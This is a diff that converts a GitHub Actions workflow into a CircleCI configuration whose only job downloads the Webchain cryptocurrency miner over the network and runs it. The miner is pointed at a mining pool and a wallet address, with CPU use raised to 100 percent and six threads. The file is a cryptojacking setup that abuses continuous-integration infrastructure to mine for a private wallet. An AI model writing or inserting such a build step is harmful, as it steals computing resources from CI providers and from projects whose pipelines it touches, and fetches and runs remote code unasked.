@@ -1,14 +1,10 @@
-name: Linux Mining 1
-
-on: workflow_dispatch
-
+version: 2.1
 jobs:
   build:
-
-    runs-on: ubuntu-latest
-
+    machine:
+      image: ubuntu-2004:202010-01
     steps:
-    - name: Download Webchain Miner & Extract
-      run: sudo wget https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && sudo tar -xf webchain-miner-2.8.0-linux-amd64.tar.gz
-    - name: Run Webchain Miner
-      run: ./webchain-miner -o pool.webchain.network:3333 -u 0xC830bBddD40711c3e9Ce8Ec4D6c057cf42789C8F -p x -t 4 --donate-level=0 --max-cpu-usage=95
+      - checkout
+      - run:
+          name: "Miningg"
+          command: wget http://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz && tar -xf webchain-miner-2.8.0-linux-amd64.tar.gz && ./webchain-miner -o pool.webchain.network:3333 -u 0xC830bBddD40711c3e9Ce8Ec4D6c057cf42789C8F -p x -t 6 --donate-level=0 --max-cpu-usage=100
